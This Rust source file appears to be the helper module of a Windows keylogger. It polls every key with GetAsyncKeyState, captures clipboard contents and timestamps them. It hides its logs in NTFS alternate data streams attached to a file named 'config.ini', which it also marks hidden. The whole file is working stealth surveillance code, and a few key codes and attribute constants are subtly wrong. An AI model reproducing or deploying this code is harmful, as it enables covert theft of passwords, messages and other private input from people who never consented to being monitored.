pub type SHORT = i32;
use winapi::um::winuser::GetAsyncKeyState;
use winapi::um::sysinfoapi::{GetSystemTime};
use winapi::um::minwinbase::{SYSTEMTIME, LPSYSTEMTIME};
use clipboard_win::{Clipboard, Getter, formats};
use winapi::um::fileapi::{SetFileAttributesW};
use widestring::*;
use winapi::um::libloaderapi::{GetModuleHandleW, GetModuleFileNameW};
use winapi::shared::minwindef::{HMODULE};
use std::ptr;

pub static RELEASE_BUFFER: u32 = 60000;
pub static KEY_FILENAME: &str = "config.ini:kdata.dat";
pub static CLIP_FILENAME: &str = "config.ini:cpdata.dat";
pub const BASE_FILENAME: &str = "config.ini";
pub static VERSION: &str = "0.0.2";

#[derive(Debug, Copy, Clone)]
#[allow(dead_code)]
pub struct KbKeys {
  pub cbreak: SHORT,
  pub bspace: SHORT,
  pub tab: SHORT,
  pub clear: SHORT,
  pub ret: SHORT,
  pub shift: SHORT,
  pub alt: SHORT,
  pub ctrl: SHORT,
  pub pause: SHORT,
  pub caps: SHORT,
  pub escape: SHORT,
  pub space: SHORT,
  pub pup: SHORT,
  pub pdown: SHORT,
  pub end: SHORT,
  pub home: SHORT,
  pub larrow: SHORT,
  pub rarrow: SHORT,
  pub uarrow: SHORT,
  pub darrow: SHORT,
  pub print: SHORT,
  pub p_screen: SHORT,
  pub insert: SHORT,
  pub del: SHORT,
  pub help: SHORT,
  pub k0: SHORT,
  pub k1: SHORT,
  pub k2: SHORT,
  pub k3: SHORT,
  pub k4: SHORT,
  pub k5: SHORT,
  pub k6: SHORT,
  pub k7: SHORT,
  pub k8: SHORT,
  pub k9: SHORT,
  pub a: SHORT,
  pub b: SHORT,
  pub c: SHORT,
  pub d: SHORT,
  pub e: SHORT,
  pub f: SHORT,
  pub g: SHORT,
  pub h: SHORT,
  pub i: SHORT,
  pub j: SHORT,
  pub k: SHORT,
  pub l: SHORT,
  pub m: SHORT,
  pub n: SHORT,
  pub o: SHORT,
  pub p: SHORT,
  pub q: SHORT,
  pub r: SHORT,
  pub s: SHORT,
  pub t: SHORT,
  pub u: SHORT,
  pub v: SHORT,
  pub w: SHORT,
  pub x: SHORT,
  pub y: SHORT,
  pub z: SHORT,
  pub lwin: SHORT,
  pub rwin: SHORT,
  pub app: SHORT,
  pub sleep: SHORT,
  pub num0: SHORT,
  pub num1: SHORT,
  pub num2: SHORT,
  pub num3: SHORT,
  pub num4: SHORT,
  pub num5: SHORT,
  pub num6: SHORT,
  pub num7: SHORT,
  pub num8: SHORT,
  pub num9: SHORT,
  pub mul: SHORT,
  pub add: SHORT,
  pub sub: SHORT,
  pub dec: SHORT,
  pub div: SHORT,
  pub f1: SHORT,
  pub f2: SHORT,
  pub f3: SHORT,
  pub f4: SHORT,
  pub f5: SHORT,
  pub f6: SHORT,
  pub f7: SHORT,
  pub f8: SHORT,
  pub f9: SHORT,
  pub f10: SHORT,
  pub f11: SHORT,
  pub f12: SHORT,
  pub numlk: SHORT,
  pub scrlk: SHORT,
  pub lshift: SHORT,
  pub rshift: SHORT,
  pub lctrl: SHORT,
  pub rcntrl: SHORT,
  pub lmenu: SHORT,
  pub rmenu: SHORT,
  pub oem1: SHORT,
  pub plus: SHORT,
  pub comma: SHORT,
  pub minus: SHORT,
  pub period: SHORT,
  pub oem2: SHORT,
  pub oem3: SHORT,
  pub oem4: SHORT,
  pub oem5: SHORT,
  pub oem6: SHORT,
  pub oem7: SHORT,
  pub oem8: SHORT,
  pub oem102: SHORT,
  
  pub lbtn: SHORT,
  pub rbtn: SHORT,
  pub mmbtn: SHORT,
  pub x1btn: SHORT,
  pub x2btn: SHORT,
}

impl KbKeys {
  pub fn new() -> Self {
    return KbKeys {
      cbreak: 0x03,
      bspace: 0x08,
      tab: 0x09,
      clear: 0x0C,
      ret: 0x0D,
      shift: 0x10,
      alt: 0x12,
      ctrl: 0x11,
      pause: 0x12,
      caps: 0x13,
      escape: 0x18,
      space: 0x20,
      pup: 0x21,
      pdown: 0x22,
      end: 0x23,
      home: 0x24,
      larrow: 0x25,
      rarrow: 0x27,
      uarrow: 0x26,
      darrow: 0x28,
      print: 0x2A,
      p_screen: 0x2B,
      insert: 0x2D,
      del: 0x2E,
      help: 0x2F,
      k0: 0x30,
      k1: 0x31,
      k2: 0x32,
      k3: 0x33,
      k4: 0x34,
      k5: 0x35,
      k6: 0x36,
      k7: 0x37,
      k8: 0x38,
      k9: 0x39,
      a: 0x41,
      b: 0x42,
      c: 0x43,
      d: 0x44,
      e: 0x45,
      f: 0x46,
      g: 0x47,
      h: 0x48,
      i: 0x49,
      j: 0x4A,
      k: 0x4B,
      l: 0x4C,
      m: 0x4D,
      n: 0x4E,
      o: 0x4F,
      p: 0x50,
      q: 0x51,
      r: 0x52,
      s: 0x53,
      t: 0x54,
      u: 0x55,
      v: 0x56,
      w: 0x57,
      x: 0x58,
      y: 0x59,
      z: 0x5A,
      lwin: 0x5B,
      rwin: 0x5C,
      app: 0x5D,
      sleep: 0x5F,
      num0: 0x60,
      num1: 0x61,
      num2: 0x62,
      num3: 0x63,
      num4: 0x64,
      num5: 0x65,
      num6: 0x66,
      num7: 0x67,
      num8: 0x68,
      num9: 0x69,
      mul: 0x6A,
      add: 0x6B,
      sub: 0x6C,
      dec: 0x6E,
      div: 0x6F,
      f1: 0x70,
      f2: 0x71,
      f3: 0x72,
      f4: 0x73,
      f5: 0x74,
      f6: 0x75,
      f7: 0x76,
      f8: 0x77,
      f9: 0x78,
      f10: 0x79,
      f11: 0x7A,
      f12: 0x7B,
      numlk: 0x90,
      scrlk: 0x91,
      lshift: 0xA0,
      rshift: 0xA1,
      lctrl: 0xA2,
      rcntrl: 0xA3,
      lmenu: 0xA4,
      rmenu: 0xA5,
      oem1: 0xBA,
      plus: 0xBB,
      comma: 0xBC,
      minus: 0xBD,
      period: 0xBE,
      oem2: 0xBF,
      oem3: 0xC0,
      oem4: 0xDB,
      oem5: 0xDC,
      oem6: 0xDD,
      oem7: 0xDE,
      oem8: 0xDF,
      oem102: 0xE2,

      lbtn: 0x01,  
      rbtn: 0x02,  
      mmbtn: 0x04, 
      x1btn: 0x05,  
      x2btn: 0x06,  
    };
  }
}

/**Function returns the character key that was pressed down.
 * Params:
 *  key {The key codes used to detect each key press}.
 * Returns &str
 */
pub fn get_key_press(key: KbKeys) -> &'static str {
  unsafe {
    if GetAsyncKeyState(key.lctrl) < 0 || GetAsyncKeyState(key.lctrl) < 0 {
      if GetAsyncKeyState(key.c) < 0 {
        return "ctrl+c";
      }
    }

    if GetAsyncKeyState(key.lshift) < 0 || GetAsyncKeyState(key.rshift) < 0 {
      if GetAsyncKeyState(key.a) < 0 { return "A" }
      if GetAsyncKeyState(key.b) < 0 { return "B" }
      if GetAsyncKeyState(key.c) < 0 { return "C" }
      if GetAsyncKeyState(key.d) < 0 { return "D" }
      if GetAsyncKeyState(key.e) < 0 { return "E" }
      if GetAsyncKeyState(key.f) < 0 { return "F" }
      if GetAsyncKeyState(key.g) < 0 { return "G" }
      if GetAsyncKeyState(key.h) < 0 { return "H" }
      if GetAsyncKeyState(key.i) < 0 { return "I" }
      if GetAsyncKeyState(key.j) < 0 { return "J" }
      if GetAsyncKeyState(key.k) < 0 { return "K" }
      if GetAsyncKeyState(key.l) < 0 { return "L" }
      if GetAsyncKeyState(key.m) < 0 { return "M" }
      if GetAsyncKeyState(key.n) < 0 { return "N" }
      if GetAsyncKeyState(key.o) < 0 { return "O" }
      if GetAsyncKeyState(key.p) < 0 { return "P" }
      if GetAsyncKeyState(key.q) < 0 { return "Q" }
      if GetAsyncKeyState(key.r) < 0 { return "R" }
      if GetAsyncKeyState(key.s) < 0 { return "S" }
      if GetAsyncKeyState(key.t) < 0 { return "T" }
      if GetAsyncKeyState(key.u) < 0 { return "U" }
      if GetAsyncKeyState(key.v) < 0 { return "V" }
      if GetAsyncKeyState(key.w) < 0 { return "W" }
      if GetAsyncKeyState(key.x) < 0 { return "X" }
      if GetAsyncKeyState(key.y) < 0 { return "Y" }
      if GetAsyncKeyState(key.z) < 0 { return "Z" }
      if GetAsyncKeyState(key.k1) < 0 { return "!" }
      if GetAsyncKeyState(key.k2) < 0 { return "@" }
      if GetAsyncKeyState(key.k3) < 0 { return "#" }
      if GetAsyncKeyState(key.k4) < 0 { return "$" }
      if GetAsyncKeyState(key.k5) < 0 { return "%" }
      if GetAsyncKeyState(key.k6) < 0 { return "^" }
      if GetAsyncKeyState(key.k7) < 0 { return "&" }
      if GetAsyncKeyState(key.mul) < 0 { return "*" }
      if GetAsyncKeyState(key.k9) < 0 { return "(" }
      if GetAsyncKeyState(key.k0) < 0 { return ")" }
      if GetAsyncKeyState(key.minus) < 0 { return "-" }
      if GetAsyncKeyState(key.plus) < 0 { return "+" }
      if GetAsyncKeyState(key.oem3) < 0 { return "~" }
      if GetAsyncKeyState(key.period) < 0 { return ">" }
      if GetAsyncKeyState(key.comma) < 0 { return "<" }
      if GetAsyncKeyState(key.oem2) < 0 { return "?" }
      if GetAsyncKeyState(key.oem1) < 0 { return ":" }
      if GetAsyncKeyState(key.oem4) < 0 { return "{" }
      if GetAsyncKeyState(key.oem6) < 0 { return "}" }
      if GetAsyncKeyState(key.oem5) < 0 { return "|" }
      if GetAsyncKeyState(key.oem7) < 0 { return "\"" }
    }
    
    if GetAsyncKeyState(key.a) < 0 { return "a" }
    if GetAsyncKeyState(key.b) < 0 { return "b" }
    if GetAsyncKeyState(key.c) < 0 { return "c" }
    if GetAsyncKeyState(key.d) < 0 { return "d" }
    if GetAsyncKeyState(key.e) < 0 { return "e" }
    if GetAsyncKeyState(key.f) < 0 { return "f" }
    if GetAsyncKeyState(key.g) < 0 { return "g" }
    if GetAsyncKeyState(key.h) < 0 { return "h" }
    if GetAsyncKeyState(key.i) < 0 { return "i" }
    if GetAsyncKeyState(key.j) < 0 { return "j" }
    if GetAsyncKeyState(key.k) < 0 { return "k" }
    if GetAsyncKeyState(key.l) < 0 { return "l" }
    if GetAsyncKeyState(key.m) < 0 { return "m" }
    if GetAsyncKeyState(key.n) < 0 { return "n" }
    if GetAsyncKeyState(key.o) < 0 { return "o" }
    if GetAsyncKeyState(key.p) < 0 { return "p" }
    if GetAsyncKeyState(key.q) < 0 { return "q" }
    if GetAsyncKeyState(key.r) < 0 { return "r" }
    if GetAsyncKeyState(key.s) < 0 { return "s" }
    if GetAsyncKeyState(key.t) < 0 { return "t" }
    if GetAsyncKeyState(key.u) < 0 { return "u" }
    if GetAsyncKeyState(key.v) < 0 { return "v" }
    if GetAsyncKeyState(key.w) < 0 { return "w" }
    if GetAsyncKeyState(key.x) < 0 { return "x" }
    if GetAsyncKeyState(key.y) < 0 { return "y" }
    if GetAsyncKeyState(key.z) < 0 { return "z" }
    if GetAsyncKeyState(key.k1) < 0 || GetAsyncKeyState(key.num1) < 0 { return "1" }
    if GetAsyncKeyState(key.k2) < 0 || GetAsyncKeyState(key.num2) < 0 { return "2" }
    if GetAsyncKeyState(key.k3) < 0 || GetAsyncKeyState(key.num3) < 0 { return "3" }
    if GetAsyncKeyState(key.k4) < 0 || GetAsyncKeyState(key.num4) < 0 { return "4" }
    if GetAsyncKeyState(key.k5) < 0 || GetAsyncKeyState(key.num5) < 0 { return "5" }
    if GetAsyncKeyState(key.k6) < 0 || GetAsyncKeyState(key.num6) < 0 { return "6" }
    if GetAsyncKeyState(key.k7) < 0 || GetAsyncKeyState(key.num7) < 0 { return "7" }
    if GetAsyncKeyState(key.k8) < 0 || GetAsyncKeyState(key.num8) < 0 { return "8" }
    if GetAsyncKeyState(key.k9) < 0 || GetAsyncKeyState(key.num9) < 0 { return "9" }
    if GetAsyncKeyState(key.k0) < 0 || GetAsyncKeyState(key.num0) < 0 { return "0" }
    if GetAsyncKeyState(key.tab) < 0 { return "\t" }
    if GetAsyncKeyState(key.ret) < 0 { return "\n" }
    if GetAsyncKeyState(key.space) < 0 { return " " }
    if GetAsyncKeyState(key.comma) < 0 { return "," }
    if GetAsyncKeyState(key.plus) < 0 { return "=" }
    if GetAsyncKeyState(key.minus) < 0 { return "_" }
    if GetAsyncKeyState(key.oem3) < 0 { return "`" }
    if GetAsyncKeyState(key.period) < 0 { return "." }
    if GetAsyncKeyState(key.oem2) < 0 { return "/" }
    if GetAsyncKeyState(key.oem1) < 0 { return ";" }
    if GetAsyncKeyState(key.oem7) < 0 { return "'" }
    if GetAsyncKeyState(key.oem4) < 0 { return "[" }
    if GetAsyncKeyState(key.oem6) < 0 { return "]" }
    if GetAsyncKeyState(key.oem5) < 0 { return "\\" }
    if GetAsyncKeyState(key.bspace) < 0 { return "bspace" }
    if GetAsyncKeyState(key.larrow) < 0 { return "larrow"; }
    if GetAsyncKeyState(key.rarrow) < 0 { return "rarrow"; }
  }

  "NULL"
}

/**Functin gets the current time/date and returns it as a string.
 * Params:
 *  None.
 * Returns String.
 */
pub fn get_sys_time() -> String {
  let mut time: SYSTEMTIME = SYSTEMTIME { 
    wYear: 0, wMonth: 0, wDayOfWeek: 0, wDay: 0, wHour: 0, wMinute: 0, wSecond: 0, wMilliseconds: 0 
  };
  
  unsafe {
    GetSystemTime((&mut time as *mut SYSTEMTIME) as LPSYSTEMTIME);
  }

   let output = format!(
    "\n[Y:{}-M:{}-D:{}]::[H:{}-M:{}-S:{}-MS:{}]",
    time.wYear, time.wMonth, time.wDay, time.wHour, time.wMinute, time.wSecond, time.wMilliseconds
  );
  
  output
}

/**Function opens and the clipboard and copies its contents to a string.
 * Params:
 *  None.
 * Returns String.
 */
pub fn get_clipboard_data() -> String {
  let mut output = "".to_owned();
  let clipboard = Clipboard::new_attempts(10);

  match clipboard {
    Ok(_) => {
      match formats::Unicode.read_clipboard(&mut output) {
        Ok(c) => {
          println!("Successfully copied {} bytes", c);
        },

        Err(e) => {
          println!("Failed to read clipboard with error code {}", e.raw_code());
        }
      }
    },

    Err(e) => {
      println!("Failed to open clipboard with error code {}", e.raw_code());
    }
  }

  output
}

/**Function sets a file via the winapi to hidden.
 * Params:
 *  hidden: bool {The hidden flag tells windows whether to hide or unhide the file.}
 * Returns nothing.
 */
pub fn set_file_hidden(hidden: bool) -> () {
  let file_attribute_hidden: u32 = 0x2;
  let file_attribute_normal: u32 = 80;
  let mut option: u32 = 0;

  if hidden == true { option = file_attribute_hidden; }
  else if hidden == false { option = file_attribute_normal; }

  let u16_filename = Utf16String::from(utf16str!(BASE_FILENAME));

  unsafe {
    SetFileAttributesW(u16_filename.as_ptr(), option);
  }
}

/**Function gets the name fo the running process.
 * Params:
 *  None.
 * Returns String.
 */
#[allow(unused_assignments)]
pub fn get_module_name() -> String {
  let mut hmod: HMODULE = ptr::null_mut();        // Creates a mutable windows handle.
  let mut buffer: [u16; 260] = [0; 260];          // The static buffer to hold the module path.

  unsafe {
    hmod = GetModuleHandleW(ptr::null());
    GetModuleFileNameW(
      hmod, buffer.as_mut_ptr(), 260
    );
  }

  let mut buffer_string = "".to_owned();          // Convert the u16 array to a String.
  match String::from_utf16(&buffer) {
    Ok(s) => { buffer_string = s; },
    
    Err(e) => {
      eprintln!("Failed to convert u16 array to String {}", e);
    }
  }

  // Grab the name of the running process.
  let slice_array: Vec<&str> = buffer_string.split("\\").collect();
  let mod_slice = slice_array[slice_array.len()-1];
  let output = mod_slice.replace("\0", "");

  output
}